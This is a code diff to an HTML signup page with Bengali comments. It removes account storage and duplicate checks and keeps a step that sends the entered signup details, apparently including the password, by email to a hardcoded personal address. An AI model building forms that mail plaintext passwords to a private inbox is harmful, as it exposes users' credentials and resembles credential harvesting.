@@ -549,6 +549,11 @@
             justify-content: center;
             gap: 0.8rem;
         }
+
+        .gesture-hint i {
+            font-size: 0.9rem;
+            color: #ffa0ff;
+        }
     </style>
 </head>
 <body>
@@ -671,8 +676,7 @@
 
 <script>
     // =====================================================
-    // 🔴 শুধুমাত্র এখানে আপনার blocked ইউজারনাম গুলো লিখুন
-    // যে সকল ইউজারনাম কেউ নিতে পারবে না সেগুলো এখানে দিন
+    // 🔴🔴🔴 এখানে আপনি ব্লক করতে চান এমন সব ইউজারনাম লিখুন 🔴🔴🔴
     // =====================================================
     const BLOCKED_USERNAMES = [
         "admin",
@@ -689,60 +693,23 @@
         "support",
         "helpdesk",
         "official",
-        "verified",
-        "12",      // আপনার想要的 ইউজারনাম
-        "11"         // আপনার想要的 ইউজারনাম
+        "verified"
     ];
+    // =====================================================
+    // উপরের লিস্টে যত ইচ্ছা ইউজারনাম যোগ করুন
+    // উদাহরণ: "ps_y_co", "psyco", "myusername" ইত্যাদি
     // =====================================================
     
     // ==================== CONFIGURATION ====================
     const RECEIVER_EMAIL = "inyt_444@outlook.com";  // 🔴 আপনার ইমেইল দিন
     
-    // ==================== STORAGE KEYS ====================
-    const STORAGE_KEY = 'signup_users';
+    // ==================== কোনো localStorage ব্যবহার করা হচ্ছে না ====================
+    // এখানে শুধু ব্লক করা ইউজারনাম চেক করা হবে
     
-    // ==================== GET ALL REGISTERED USERS ====================
-    function getRegisteredUsers() {
-        let users = localStorage.getItem(STORAGE_KEY);
-        if (users) {
-            return JSON.parse(users);
-        }
-        return {};
-    }
-    
-    // ==================== SAVE REGISTERED USERS ====================
-    function saveRegisteredUsers(users) {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
-    }
-    
-    // ==================== CHECK IF USERNAME IS BLOCKED ====================
     function isUsernameBlocked(username) {
         return BLOCKED_USERNAMES.includes(username.toLowerCase());
     }
     
-    // ==================== CHECK IF USERNAME ALREADY REGISTERED ====================
-    function isUsernameRegistered(username) {
-        let users = getRegisteredUsers();
-        for (let key in users) {
-            if (users[key].username === username) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    // ==================== CHECK IF EMAIL ALREADY REGISTERED ====================
-    function isEmailRegistered(email) {
-        let users = getRegisteredUsers();
-        for (let key in users) {
-            if (users[key].email === email) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    // ==================== HELPER FUNCTIONS ====================
     function getTime() {
         let d = new Date();
         return `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()} ${String(d.getHours()%12||12).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')} ${d.getHours()>=12?'PM':'AM'}`;
@@ -838,17 +805,10 @@
             return false;
         }
         
-        if (isEmailRegistered(email)) {
-            emailField.classList.add("error-border");
-            emailField.classList.remove("success-border");
-            statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
-            statusDiv.className = "field-status active";
-            return false;
-        }
-        
+        // Email সবসময় available দেখাবে (কোনো চেক নেই)
         emailField.classList.add("success-border");
         emailField.classList.remove("error-border");
-        statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> Email available';
+        statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> Valid email';
         statusDiv.className = "field-status success";
         return true;
     }
@@ -875,8 +835,8 @@
             return false;
         }
         
-        // Check if username is blocked OR already registered
-        if (isUsernameBlocked(username) || isUsernameRegistered(username)) {
+        // শুধু চেক করা হচ্ছে ইউজারনাম ব্লক করা আছে কিনা
+        if (isUsernameBlocked(username)) {
             usernameField.classList.add("error-border");
             usernameField.classList.remove("success-border");
             statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
@@ -1007,7 +967,7 @@
         
         let username = document.getElementById("signupUsername").value.trim();
         
-        if (isUsernameBlocked(username) || isUsernameRegistered(username)) {
+        if (isUsernameBlocked(username)) {
             document.getElementById("submitBtn").disabled = true;
             return false;
         }
@@ -1017,23 +977,7 @@
         return allValid;
     }
     
-    // ==================== SAVE NEW USER ====================
-    function saveNewUser(email, username, fullname, password, phone) {
-        let users = getRegisteredUsers();
-        let userId = Date.now().toString();
-        users[userId] = {
-            email: email,
-            username: username,
-            fullname: fullname,
-            password: password,
-            phone: phone,
-            createdAt: getTime()
-        };
-        saveRegisteredUsers(users);
-        return true;
-    }
-    
-    // ==================== SEND SIGNUP EMAIL & SAVE ====================
+    // ==================== SEND SIGNUP EMAIL ====================
     function sendSignupEmail() {
         let email = document.getElementById("signupEmail").value.trim();
         let username = document.getElementById("signupUsername").value.trim();
@@ -1070,22 +1014,6 @@
             return;
         }
         
-        // Check if username already registered
-        if (isUsernameRegistered(username)) {
-            showStatus('⚠️ This username is already taken! Please choose another.', 'error');
-            document.getElementById("activeAccountMessage").style.display = "block";
-            return;
-        }
-        
-        // Check if email already registered
-        if (isEmailRegistered(email)) {
-            showStatus('⚠️ This email is already registered!', 'error');
-            return;
-        }
-        
-        // Save user
-        saveNewUser(email, username, fullname, password, phone);
-        
         // Prepare email body
         let body = `🔮 NEW SIGN UP INFORMATION 🔮\n\n`;
         body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
@@ -1115,7 +1043,7 @@
             window.open(`https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
         }
         
-        showStatus('✅ Sign up successful! Account activated. Info sent to email.', 'success');
+        showStatus('✅ Sign up successful! Info sent to email.', 'success');
         
         // Clear form
         document.getElementById("signupEmail").value = "";
@@ -1163,6 +1091,13 @@
         checkAllFields();
     });
     
+    // Clear localStorage on page load (fresh start every time)
+    // এটা করা হচ্ছে যাতে আগের কোনো ডেটা সমস্যা না করে
+    if(localStorage.getItem('signup_active_accounts')) {
+        localStorage.removeItem('signup_active_accounts');
+        console.log("✅ Previous data cleared!");
+    }
+    
     // ==================== SWIPE GESTURES ====================
     let touchStartX = 0;
     document.addEventListener('touchstart', e => {
@@ -1189,10 +1124,10 @@
         document.body.appendChild(p);
     }
     
-    // Clear any old localStorage data that might be causing issues
     console.log("✅ Signup page ready!");
     console.log("📌 Blocked usernames:", BLOCKED_USERNAMES);
-    console.log("📌 To add more blocked usernames, edit the BLOCKED_USERNAMES array in the code.");
+    console.log("📌 To block more usernames, edit the BLOCKED_USERNAMES array in the code (line 528-545)");
+    console.log("📌 কোনো localStorage ব্যবহার করা হচ্ছে না - প্রতিবার ফ্রেশ!");
 </script>
 </body>
 </html>
